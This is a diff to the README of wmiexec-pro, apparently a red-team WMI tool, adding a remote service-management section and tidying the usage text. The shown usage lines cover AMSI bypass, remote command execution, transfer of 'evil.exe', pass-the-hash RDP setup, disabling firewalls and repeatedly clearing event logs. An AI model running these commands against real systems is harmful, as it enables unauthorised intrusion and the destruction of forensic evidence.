@@ -78,19 +78,19 @@ Enable/disable amsi bypass:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 amsi -disable
 
 Execute command:
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" (slient)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output (with output)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output -save (with output and save output to file)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -clear (remove temporary class for command result storage)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" (Slient mode)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output (With output)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output -save (With output and save output to file)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -clear (Remove temporary class for command result storage)
    
 Filetransfer:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -upload -src-file "./evil.exe" -dest-file "C:\windows\temp\evil.exe" (Upload file over 512KB)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -download -src-file "C:\windows\temp\evil.exe" -dest-file "/tmp/evil.exe" (download file over 512KB)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -clear
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -download -src-file "C:\windows\temp\evil.exe" -dest-file "/tmp/evil.exe" (Download file over 512KB)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -clear (Remove temporary class for file transfer)
    
 RDP:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable (Auto configure firewall)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable-ram (enable Restricted Admin Mode for PTH)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable-ram (Enable Restricted Admin Mode for PTH)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -disable
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -disable-ram (Disable Restricted Admin Mode)
 
@@ -103,8 +103,20 @@ Firewall:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -dump (Dump all firewall rules)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -rule-id (ID from search port) -rule-op [enable/disable/remove] (enable, disable, remove specify rule)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -firewall-profile enable (Enable all firewall profiles)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -firewall-profile disable (disable all firewall profiles)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -firewall-profile disable (Disable all firewall profiles)
    
+Services:
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action create -service-name "test" -display-name "For test" -bin-path 'C:\windows\system32\calc.exe'
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action create -service-name "test" -display-name "For test" -bin-path 'C:\windows\system32\calc.exe' -class "Win32_TerminalService" (Create service via alternative class)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action start -service-name "test"
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action stop -service-name "test"
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action disable -service-name "test"
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action auto-start -service-name "test"
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action manual-start -service-name "test"
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action getinfo -service-name "test"
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action delete -service-name "test"
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -dump all-services.json
+
 Eventlog:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 eventlog -risk-i-know (Looping cleaning eventlog)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 eventlog -retrive object-ID (Stop looping cleaning eventlog)
@@ -151,11 +163,14 @@ Eventlog:
   - For enable/disable: Restricted Admin Mode: control registry key `DisableRestrictedAdmin` via `StdRegProv` class.
 
 - winrm module:
-  - For enable/disable: call  `Start/StopSerivce()` method of `Win32_Service`.
+  - For enable/disable: invoke service module.
   - For firewall rules: use module `firewall.py` to configure firewall of winrm.
 
 - firewall module:
   - Abusing `MSFT_NetProtocolPortFilter`, `MSFT_NetFirewallRule`, `MSFT_NetFirewallProfile` classes.
+
+- service module:
+  - Abusing `Win32_Service` classes.
 
 - eventlog module:
   - Execute the vbs script file `ClearEventlog.vbs` without remove `event` and `consumer`.
